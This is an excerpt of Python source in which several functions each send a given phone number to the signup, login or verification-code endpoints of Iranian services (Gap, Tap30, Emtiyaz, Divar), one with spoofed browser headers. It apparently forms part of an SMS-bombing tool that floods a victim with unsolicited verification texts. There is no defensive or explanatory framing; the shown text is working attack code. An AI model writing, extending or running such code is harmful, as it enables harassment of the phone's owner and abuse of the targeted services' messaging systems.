...
def gap(phone):
    ...
    try:
        requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=headers)
        return True
    except:
        return False
...
def tap30(phone):
    ...
    json = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        requests.post("https://tap33.me/api/v2/user", headers=headers, json=json)
        return True
    except:
        return False
...
def emtiaz(phone):
    ...
    data = "send=1&cellphone=0"+phone.split("+98")[1]
    try:
        requests.post("https://web.emtiyaz.app/json/login", headers=headers, data=data)
        return True
    except:
        return False

def divar(phone):
    headers = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    json = {"phone":phone.split("+98")[1]}
    try:
        requests.post("https://api.divar.ir/v5/auth/authenticate", headers=headers, json=json)
        return True
    except:
        return False
